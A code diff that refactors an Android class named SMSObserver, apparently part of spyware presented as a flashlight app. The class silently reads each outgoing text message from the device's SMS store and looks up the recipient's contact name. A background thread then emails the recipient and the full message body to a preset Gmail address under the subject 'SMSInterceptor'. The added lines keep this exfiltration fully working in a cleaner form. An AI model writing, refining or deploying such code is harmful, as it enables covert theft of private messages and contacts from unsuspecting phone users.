@@ -24,37 +24,42 @@ public class SMSObserver extends ContentObserver {
 
   
   public  static Context context;
-  private static Contacts contact;
-  private static DatabaseHandler db;
-  private static GmailSender sender; 
-  private static Configure configure;
 
   private static String endPoint;
   private static String initId = "0";
-  private static String sPhoneNumberDb;
-  private static String sEmailAddressDb;
   private static String gmailEmailString;
 
-  private static final String TAG = "FlashLight SMSObserver";
+  private static final String SUBJECT = "SMSInterceptor";
+  private static final String TAG     = "FlashLight SMSObserver";
 
   public SMSObserver(Handler handler, Context context) {
     super(handler);
 
     handler = handler;    
     SMSObserver.context = context;
-    db = new DatabaseHandler(context);
-    contact   = new Contacts();
-    configure = new Configure();
-    gmailEmailString = configure.emailAddress();
+    gmailEmailString = new Configure().emailAddress();
 
-    Log.d(TAG, "Entering SMSObserver constructor");
+  }
 
+  public void threading(final String message) {
+    new Thread(new Runnable() {
+      @Override
+      public void run() {
+        try {
+          new GmailSender().sendMail(SUBJECT, message, gmailEmailString);
+        }
+        catch(Exception e) {
+          e.printStackTrace();
+          Log.e(TAG, "onChange() Exception e " + e.toString());
+        }
+      }
+    }).start();
   }
 
   public String endPoint(final String number, final Context context) {
 
     String end_point;
-    final String contact_name  = contact.getContactName(number, context);
+    final String contact_name  = new Contacts().getContactName(number, context);
 
     if(!contact_name.isEmpty()) {
       end_point = "" + number + "(" + contact_name + ")";
@@ -69,8 +74,6 @@ public class SMSObserver extends ContentObserver {
   public void onChange(boolean selfChange) {
     super.onChange(selfChange);
 
-    Log.i(TAG, "Entering onChange()");
-
     Cursor cursor = null;
     Uri uriSMSURI = Uri.parse("content://sms");
     String[] sCol = {"_id","type","body","address"};
@@ -81,37 +84,14 @@ public class SMSObserver extends ContentObserver {
       cursor = context.getContentResolver().query(uriSMSURI, sCol, null, null, sOrder);
       cursor.moveToLast();
 
-      String id   = cursor.getString(cursor.getColumnIndex("_id"));
-      String type = cursor.getString(cursor.getColumnIndex("type"));
+      final String id   = cursor.getString(cursor.getColumnIndex("_id"));
+      final String type = cursor.getString(cursor.getColumnIndex("type"));
 
       final String body = cursor.getString(cursor.getColumnIndex("body"));
       final String addr = cursor.getString(cursor.getColumnIndex("address"));
 
-      //if(!(String.valueOf(initId)).equals(id)) && type.equals("2")) {
       if(!initId.equals(id) && type.equals("2")) {
-        initId = id;
-        Log.d(TAG, "Ougoing text message sent!");
-        Log.i(TAG, "onChange() id: " + id + ", InitId: " +
-                                       initId + ", type: " +
-                                       type + ", body: " +
-                                       body + ", addr: " +
-                                       endPoint(addr, context));
-        new Thread(new Runnable() {
-
-          @Override
-          public void run() {
-            try {
-              sender = new GmailSender();
-              sender.sendMail("SMSInterceptor",
-                "OUTGOING SMS!\n" + "Sent to: " + endPoint(addr, context) + "\nbody:\n" + body,
-                gmailEmailString);
-            }
-            catch(Exception e) {
-              e.printStackTrace();
-              Log.e(TAG, "onChange() Exception e " + e.toString());
-            }
-          }
-        }).start();
+        threading("OUTGOING SMS!\n" + "Sent to: " + endPoint(addr, context) + "\nbody:\n" + body); initId = id;
       }
       else { } // Incoming messages if type == 1
     }
